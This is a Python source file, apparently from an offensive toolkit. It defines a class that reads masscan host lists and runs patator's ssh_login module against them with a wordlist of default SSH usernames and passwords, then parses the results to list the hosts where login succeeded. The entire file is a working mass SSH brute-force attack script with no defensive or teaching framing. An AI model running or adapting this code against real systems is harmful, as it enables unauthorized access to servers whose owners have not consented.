# -*- coding: utf-8 -*-
import subprocess

from bs4 import BeautifulSoup

from libs import uix
from libs import utils


class Bruteforce(object):
    def __init__(self):
        self.hosts_files = utils.show_results_files('masscan', 'hosts')     # List of result files in masscan dir.
        self.directory = utils.get_path_to_dir('bruteforce')                # Path to bruteforce directory.
        self.result_dir = None                                              # Results dir in bruteforce directory.

    def parse_result_file(self):
        """
        Method which parse result file , filtered data such as host, mesg and write data in new file.
        :return:
        """
        # Read and parse data.
        with open(self.result_dir + '/RESULTS.xml') as file:
            bs_obj = BeautifulSoup(file, 'lxml-xml')

        candidates = bs_obj.findAll('candidate')
        hosts_num = len(candidates)
        mesgs = bs_obj.findAll('mesg')
        start_time = bs_obj.find('start')['utc']
        stop_time = bs_obj.find('stop')['utc']

        # Write filtered data in new file.
        for i in range(hosts_num):
            host = candidates[i].text
            mesg = mesgs[i].text

            pattern = f'{host}:{mesg}'.replace('"', '')

            with open(self.result_dir + '/filtered_result', 'a') as file:
                file.writelines(pattern)

        return uix.bruteforce_result_msg(start_time, stop_time, hosts_num)

    def start_bruteforce(self, choice):
        """
        Method which start bruteforce attack on hosts from chosen hosts file.
        :param choice:
        :return:
        """
        chosen_file = self.hosts_files[int(choice)]                                     # Get chosen file.
        port = utils.get_port_from_file_name(chosen_file)                               # Get port from file by choice.
        date = utils.date_today()                                                       # Get today date.
        self.result_dir = f'{self.directory}/{port}_{date}'                             # Set current result directory.

        # Exec command.
        command = ['patator', 'ssh_login', 'host=FILE0', 'user=COMBO10', 'password=COMBO11',
                   f'0=results/masscan/{chosen_file}', '1=wordlists/ssh-default-userpass.txt',
                   '-x', 'ignore:code=1', '-x', 'ignore:fgrep="Authentication Failed"',
                   '-x', 'free=host:code=0', '-l', f'{self.directory}/{port}_{date}']

        subprocess.run(command, stdout=subprocess.PIPE, encoding='utf-8')

        # Parse results and show menu.
        msg = self.parse_result_file()
        uix.show_menu(msg=msg)

    def run(self):
        """
        Method which get choice of which file of hosts need to use , then run bruteforce and write results.
        :return:
        """
        choice = uix.bruteforce_start_msg(self.hosts_files)
        self.start_bruteforce(choice)

